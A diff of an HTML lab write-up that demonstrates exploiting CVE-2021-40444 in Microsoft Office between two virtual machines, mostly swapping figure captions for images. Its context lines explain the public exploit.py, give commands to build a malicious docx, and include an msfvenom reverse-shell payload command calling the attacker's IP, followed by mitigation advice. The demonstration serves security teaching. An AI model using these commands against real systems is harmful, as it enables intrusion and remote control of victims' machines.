@@ -60,8 +60,11 @@
 
 									<p>Exploiting this vulnerability involves crafting a specially designed Office document with an object pointing to a malicious script. When the victim opens the document, the malicious script is executed by MSHTML. Consequently, the attacker can install malware on the victim's computer, exfiltrate sensitive information, or take full control of the compromised system.</p>
 									
-									<p><strong>Fig.1: Attack chain of CVE-2021-40444</strong></p>
-									
+									<div style="text-align: center;">
+									<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture1.png" alt="Fig.1: Attack chain of CVE-2021-40444" width="300px" /></a>
+									<strong>Fig.1: Attack chain of CVE-2021-40444</strong>
+									</div></br>
+
 									<p>CVE-2021-40444 impacts various versions of Microsoft Office, including 2010, 2013, 2016, 2019, and Microsoft 365. It resides within the ActiveX control utilized by the MSHTML engine, responsible for rendering and displaying HTML content within Office applications.</p>
 									
 									<p>The vulnerability originates from how the MSHTML engine handles objects in memory, particularly concerning processing specially crafted Office documents. An attacker can create a malicious document, such as a Word or PowerPoint file, that embeds a carefully crafted ActiveX control. When a user opens the manipulated document, the MSHTML engine fails to adequately validate and handle the embedded ActiveX control, allowing the execution of arbitrary code with the user's privileges.</p>
@@ -87,8 +90,9 @@
 
 							<section>
 								<h3>Breakdown of exploit.py for the virus</h3>
-								<div class="code">
-									<p><strong>Fig.2: Breakdown of exploit</strong></p>
+								<div style="text-align: center;">
+									<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture2.png" alt="Fig.2: Breakdown of exploit" width="300px" /></a>
+									<strong>Fig.2: Breakdown of exploit</strong>
 								</div>
 								<p><strong>Function `generate_payload()` is defined.</strong><br/><br/>
 									The script reads the second and third command-line arguments (<strong>sys.argv[2]</strong> and <strong>sys.argv[3]</strong>) and assigns them to <strong>payload_path</strong> and <strong>srv_url</strong>, respectively. These arguments are used to specify the path of the DLL payload file and the HTML exploit URL.<br/><br/>
@@ -98,19 +102,28 @@
 									The script prints a message indicating that it is writing the HTML Server URL. Then, it opens the "document.xml.rels" file inside the "data/tmp_doc/word/_rels/" directory and reads its content into the variable <strong>xml_content</strong>.
 								</p>	
 									
-									<p><strong>Fig.3: Breakdown of exploit</strong><br/><br/>
+								<div style="text-align: center;">
+									<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture3.png" alt="Fig.3: Breakdown of exploit" width="300px" /></a>
+									<strong>Fig.3: Breakdown of exploit</strong>
+								</div>
 										The script replaces the placeholder <strong><EXPLOIT_HOST_HERE></strong> in the <strong>xml_content</strong> variable with the HTML exploit URL (<strong>srv_url + '/word.html'</strong>) provided in the command-line argument. Then, it writes the updated content back to the "document.xml.rels" file.<br/><br/>
 										The script prints a message indicating that it is generating a malicious docx file. Then, it changes the current working directory to "data/tmp_doc/." Next, it uses the zip command to compress all the files and directories in the "data/tmp_doc/" directory into a new file named "document.docx." The "document.docx" file is then copied to the "out" directory. After that, the "tmp_doc" directory is removed, and the script goes back to the parent directory.<br/><br/>
 									
 
 									<strong>The script prints a message indicating that it is generating a malicious CAB file.</strong> It changes the current working directory to "data/" and creates a new directory named "cab/." The "word.dll" and "msword.inf" files are copied into the "cab/" directory. Next, it executes the lcab command to create a CAB file named "out.cab" from the "msword.inf" file. The "out.cab" file is then patched, and a new file named "word.cab" is created inside the "srv/" directory. After these operations, the "word.dll," "msword.inf," and "cab/" directories are removed, and the script goes back to the parent directory.</p>
 									
-									<p><strong>Fig.4: Breakdown of exploit</strong><br/><br/>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture4.png" alt="Fig.4: Breakdown of exploit" width="300px" /></a>
+										<strong>Fig.4: Breakdown of exploit</strong>
+									</div>
 										The script prints a message indicating that it is updating information on the HTML exploit. It changes the current working directory to "srv/" and copies the "backup.html" file to "word.html." Next, it reads the content of "word.html" into the variable <strong>exploit_content</strong> and replaces the placeholder <strong>&lt;HOST_CHANGE_HERE&gt;</strong> with the path to the generated "word.cab" file. Finally, the updated <strong>exploit_content</strong> is written back to "word.html," and the script goes back to the parent directory.
 										</p>
 									
-										<p><strong>Fig.5: Breakdown of exploit</strong><br/><br/>
-											The script prints messages indicating that the malicious Word Document payload and CAB file have been generated and gives instructions on how to proceed. The function then returns.</p>
+										<div style="text-align: center;">
+											<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture5.png" alt="Fig.5: Breakdown of exploit" width="300px" /></a>
+											<strong>Fig.5: Breakdown of exploit</strong>
+										</div>
+										<p>The script prints messages indicating that the malicious Word Document payload and CAB file have been generated and gives instructions on how to proceed. The function then returns.</p>
 									
 							</section>
 					
@@ -150,33 +163,60 @@
 									
 									<p>Making sure Network Adapter is enabled and set to “Bridged Adapter”. By using the Bridged Adapter network mode, we can simulate a network environment where the VMs are treated as separate entities on the network, facilitating the necessary network interactions required for the exploit demonstration.</p>
 									
-									<p><strong>Fig.6:</strong> Windows VM network setting</p>
-									<p><strong>Fig.7:</strong> Kali Linux VM network setting</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture6.png" alt="Fig.6: Windows VM network setting" width="300px" /></a>
+										<strong>Fig.6: Windows VM network setting</strong>
+									</div>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture7.png" alt="Fig.7: Kali Linux VM network setting" width="300px" /></a>
+										<strong>Fig.7: Kali Linux VM network setting</strong>
+									</div>
 									
 									<p>Next, we should verify the connectivity, to do this we need to make sure Windows 10 VM is able to ping the Kali Linux VM successfully. This can be done by opening command prompt and using the command “ping &lt;Kali Linux IP&gt;”. If the ping is successful, this shows that the Windows 10 VM can communicate with the Kali Linux VM.</p>
 									
-									<p><strong>Fig.8:</strong> Ifconfig on Attacker VM</p>
-									<p><strong>Fig.9:</strong> Victim VM able to ping Attacker VM</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture8.png" alt="Fig.8: Ifconfig on Attacker VM" width="300px" /></a>
+										<strong>Fig.8: Ifconfig on Attacker VM</strong>
+									</div>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture9.png" alt="Fig.9: Victim VM able to ping Attacker VM" width="300px" /></a>
+										<strong>Fig.9: Victim VM able to ping Attacker VM</strong>
+									</div>
 									
 									<p>After configuring and setting up the VMs are successful, we can then start cloning the GitHub repository, which contains the exploit code, to the Attacker VM. Using this command “git clone https://github.com/lockedbyte/CVE-2021-40444”</p>
 									
-									<p><strong>Fig.10:</strong> Cloning of package to Attacker VM</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture10.png" alt="Fig.10: Cloning of package to Attacker VM" width="300px" /></a>
+										<strong>Fig.10: Cloning of package to Attacker VM</strong>
+									</div>
 									
 									<p>We can locate the folder in /root/</p>
 									
-									<p><strong>Fig.11:</strong> CVE-2021-40444 in Attacker VM</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture11.png" alt="Fig.11: CVE-2021-40444 in Attacker VM" width="300px" /></a>
+										<strong>Fig.11: CVE-2021-40444 in Attacker VM</strong>
+									</div>
 									
 									<p>Navigating to the repository's root directory:</p>
 									
-									<p><strong>Fig.12:</strong> Navigate to CVE-2021-40444</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture12.png" alt="Fig.12: Navigate to CVE-2021-40444" width="300px" /></a>
+										<strong>Fig.12: Navigate to CVE-2021-40444</strong>
+									</div>
 									
 									<p>Generating the malicious document by running the exploit script. In this case, we would be using the following script: python3 exploit.py generate test/calc.dll http://&lt;LinuxIP&gt;. To break it down, this script would run the exploit.py which is the name of the Python script that contains the code for CVE-2021-40444. Generate is the command that instructs it to generate the malicious documents. Test/calc.dll specifies the path and name of the DLL (Dynamic Link Library) to be used. Which in this demonstration is the “calc.dll” which is the Calculator. The purpose of using "calc.dll" is to demonstrate that the exploit is successful and can execute arbitrary code on the target system. While in the real world scenarios, it would be replaced with a malicious payload. Lastly, http://&lt;LinuxIP&gt;, the URL where the malicious document will make requests to fetch additional files required for the exploit.</p>
 									
-									<p><strong>Fig.13:</strong> Generating CVE-2021-40444 malicious document</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture13.png" alt="Fig.13: Generating CVE-2021-40444 malicious document" width="300px" /></a>
+										<strong>Fig.13: Generating CVE-2021-40444 malicious document</strong>
+									</div>
 									
 									<p>If the exploit is executed successfully, a new file named "document.docx" will be generated in the "/out" directory. This "document.docx" file is the one that needs to be opened on the Windows machine as part of the exploitation process.</p>
 									
-									<p><strong>Fig.14:</strong> document.docx successfully created</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture14.png" alt="Fig.14: document.docx successfully created" width="300px" /></a>
+										<strong>Fig.14: document.docx successfully created</strong>
+									</div>
 									
 							</section>
 							
@@ -184,11 +224,17 @@
 								<h3>Demonstration of the exploit in action</h3>
 								<p>With the successful creation of the malicious words document (document.docx), we can now transfer the malicious document to our Victim VM. In a real-world scenario, this would usually be done through emails, downloads, cloud services or etc. For this demonstration purpose, we would be using the Shared Folder function of Oracle VirtualBox to transfer the document.</p>
 
-									<p><strong>Fig.15:</strong> Transferring of document.docx to shared folder</p>
+								<div style="text-align: center;">
+									<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture15.png" alt="Fig.15: Transferring of document.docx to shared folder" width="300px" /></a>
+									<strong>Fig.15: Transferring of document.docx to shared folder</strong>
+								</div>
 
 									<p>Now we have access to the malicious file, document.docx on our Victim VM. Next, we would use the command “sudo python3 exploit.py host 80” on our Attacker VM.</p>
 
-									<p><strong>Fig.16:</strong> Starting a HTTP server</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture16.png" alt="Fig.16: Starting a HTTP server" width="300px" /></a>
+										<strong>Fig.16: Starting a HTTP server</strong>
+									</div>
 
 									<p>This starts an HTTP server on the Linux machine. This server is essential for serving the required files, namely "word.html" and "word.cab," to the Windows machine during the exploit.</p>
 
@@ -198,11 +244,17 @@
 
 									<p>Once we open the "document.docx" file on the Windows machine, we will observe requests being sent from the Windows machine to the Linux machine. These requests are made to fetch the "word.html" and "word.cab" files. If the exploit is successful, you will see the Calculator application appearing on the Windows machine. This indicates that the code execution has been accomplished effectively.</p>
 
-									<p><strong>Fig.17:</strong> Calculator app pop out</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture17.png" alt="Fig.17: Calculator app pop out" width="300px" /></a>
+										<strong>Fig.17: Calculator app pop out</strong>
+									</div>
 
 									<p>From the screenshot below, we can see the “word.cab” and “word.html” being requested</p>
 
-									<p><strong>Fig.18:</strong> .cab and .html files are being requested by malicious file</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture18.png" alt="Fig.18: .cab and .html files are being requested by malicious file" width="300px" /></a>
+										<strong>Fig.18: .cab and .html files are being requested by malicious file</strong>
+									</div>
 
 									<h3>Getting Reverse Shell:</h3>
 
@@ -210,17 +262,29 @@
 
 									<p>Using the command “msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=&lt;Attacker IP&gt; lport=4444 -f dll -o test/revshell.dll”</p>
 
-									<p><strong>Fig.19:</strong> Malicious payload created</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture19.png" alt="Fig.19: Malicious payload created" width="300px" /></a>
+										<strong>Fig.19: Malicious payload created</strong>
+									</div>
 
 									<p>We would then generate the document.docx file again using “python3 exploit.py generate test/revshell.dll http://192.168.1.95”</p>
 
-									<p><strong>Fig.20:</strong> New document.docx file created</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture20.png" alt="Fig.20: New document.docx file created" width="300px" /></a>
+										<strong>Fig.20: New document.docx file created</strong>
+									</div>
 
 									<p>To initiate the remote code execution, we need to launch the multi-handler through the msfconsole. This is necessary because we are using the meterpreter payload. By starting the msfconsole and utilizing the “exploit/multi/handler” module, we can establish a connection with the compromised system and handle the incoming meterpreter session.</p>
 
-									<p><strong>Fig.21:</strong> Setting up of multi handler</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture21.png" alt="Fig.21: Setting up of multi handler" width="300px" /></a>
+										<strong>Fig.21: Setting up of multi handler</strong>
+									</div>
 
-									<p><strong>Fig.22:</strong> Reverseshell successful</p>
+									<div style="text-align: center;">
+										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture22.png" alt="Fig.22: Reverseshell successful" width="300px" /></a>
+										<strong>Fig.22: Reverseshell successful</strong>
+									</div>
 
 							</section>
 					
@@ -243,6 +307,10 @@
 								<p>1. <strong>Keep software up to date</strong>: Regularly update all Microsoft products, including Windows and Office, to the latest available versions. This ensures that your systems are protected against emerging threats.</p>
 
 								<p>2. <strong>Deploy security patches</strong>: Ensure that all systems and applications are promptly updated with the latest security patches. Microsoft frequently releases patches for known vulnerabilities, and it is crucial to apply them as soon as possible (<a href="https://nvd.nist.gov/">NVD – Home</a>).</p>
+								<div style="text-align: center;">
+									<img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture23.png" alt="Fig.23: Microsoft Patches for CVE-2021-40444" width="300px" />
+									</br><strong>Fig.23: Microsoft Patches for CVE-2021-40444</strong>
+								</div>
 
 								<p>3. <strong>Implement security best practices</strong>: Organizations should follow security best practices for operating systems, applications, and network infrastructure. This includes restricting user privileges, enabling firewall protection, implementing strong passwords, and regularly auditing system logs for suspicious activities (<a href="https://msrc-blog.microsoft.com/2021/09/07/security-update-guide/">Security Update Guide - Microsoft Security Response Center. 2021, September 7</a>).</p>
 
